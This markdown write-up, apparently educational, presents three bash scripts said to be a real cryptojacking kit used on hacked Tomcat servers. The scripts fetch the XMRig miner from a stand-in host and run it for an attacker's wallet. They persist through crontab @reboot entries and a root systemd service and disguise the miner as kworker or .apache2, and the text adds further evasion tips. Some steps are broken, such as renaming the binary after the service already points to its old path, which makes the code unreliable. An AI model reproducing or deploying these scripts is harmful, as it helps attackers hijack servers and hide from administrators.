# real leaked example of a simple **crypto mining script** attackers used after hacking Tomcat servers
```bash
#!/bin/bash

# Download and run XMRig miner
wget http://malicious-site.com/xmrig -O /tmp/xmrig
chmod +x /tmp/xmrig

# Start mining in the background
/tmp/xmrig -o pool.minexmr.com:4444 -u 49d5X...mywalletaddress...dsa1234 -p tomcat_hacked_server --donate-level=1 &

# Hide process
disown
```

## What This Script Does
 **1.** Downloads a hidden copy of **XMRig** (a popular Monero miner)
 **2.** Gives it execution permissions
 **3.** Connects it to a mining pool (**pool.minexmr.com**)
 **4.** Sends mined coins to the attacker's **wallet address**
 **5.** Runs it quietly in the background (`disown` hides it from the terminal

## Extra tricks attackers added sometimes
- Modify crontab (`cron`) to **restart miner** if killed
- Rename miner to look like a legit process (`/tmp/sshd`, `/tmp/kworker`, etc.)
- Lower CPU usage to avoid being detected (like `--cpu-priority 2`)
 
---

# Auto-reinstall miner after reboot
```bash
#!/bin/bash

# Download and setup miner
wget http://malicious-site.com/xmrig -O /tmp/kworker
chmod +x /tmp/kworker

# Run miner in background
/tmp/kworker -o pool.minexmr.com:4444 -u 49d5X...wallet...dsa1234 -p tomcat_hacked --donate-level=1 &

# Set up persistence: Add to crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/kworker -o pool.minexmr.com:4444 -u 49d5X...wallet...dsa1234 -p tomcat_hacked --donate-level=1 &") | crontab -

# Hide it better by renaming process
mv /tmp/kworker /tmp/.apache2

# Update crontab again for new name
(crontab -l 2>/dev/null; echo "@reboot /tmp/.apache2 -o pool.minexmr.com:4444 -u 49d5X...wallet...dsa1234 -p tomcat_hacked --donate-level=1 &") | crontab -
```

## What This Script Does
- Downloads miner → saves it as a **hidden file** (`.apache2`)
- Runs it **in background** silently
- **Edits crontab** → adds a line:
    - `@reboot /tmp/.apache2 ...`
- Every time the server **reboots**, the miner **auto-starts** again!

>    If you cleaned the server manually but forgot crontab, it would come back after reboot!!           (That’s why persistence is so dangerous.)


## In Short
- Miner = hidden
- Miner = starts on reboot
- Server = secretly mining forever unless a smart admin checks crontab and processes

---


# Using systemd to make miner persistent
```bash
#!/bin/bash

# Step 1: Download and set up the miner
wget http://malicious-site.com/xmrig -O /tmp/.xmrig
chmod +x /tmp/.xmrig

# Step 2: Create a systemd service for auto-start on boot
echo "[Unit]
Description=Cryptocurrency Miner
After=network.target

[Service]
ExecStart=/tmp/.xmrig -o pool.minexmr.com:4444 -u 49d5X...wallet...dsa1234 -p tomcat_hacked --donate-level=1
Restart=always
User=root

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/miner.service

# Step 3: Enable and start the malicious service
systemctl daemon-reload
systemctl enable miner.service
systemctl start miner.service

# Step 4: Hide the process (rename miner to a system process)
mv /tmp/.xmrig /tmp/.apache2
```

## Whats Happening Here
1. **Download**: The script downloads the miner (`xmrig`) and saves it as `.xmrig` in `/tmp/`.
2. **systemd Service**:
    - The script creates a **custom systemd service** (`miner.service`).
    - **ExecStart** starts the miner when the system boots.
    - **Restart=always** ensures that the miner restarts if it's killed.
    - The service will run as the **root user**, which means it has full permissions.
3. **Enable**: The script makes sure the service starts **automatically** after every reboot using `systemctl enable`.
4. **Process Hiding**: It **renames the miner** to a system process name (`.apache2`) to avoid detection.

## The Result
- The miner will run as a **background service** every time the server reboots.
- Even if the miner is killed, **systemd** will **restart it automatically**.
- It will be hidden as a **legitimate system service** (harder to detect).

## Why systemd is so Effective 
- Unlike `cron`, systemd is the **core of Linux system management**. Admins often **overlook** systemd services running in the background.
- Systemd services are **persistent** and won’t easily be removed by just deleting the file or killing the process.


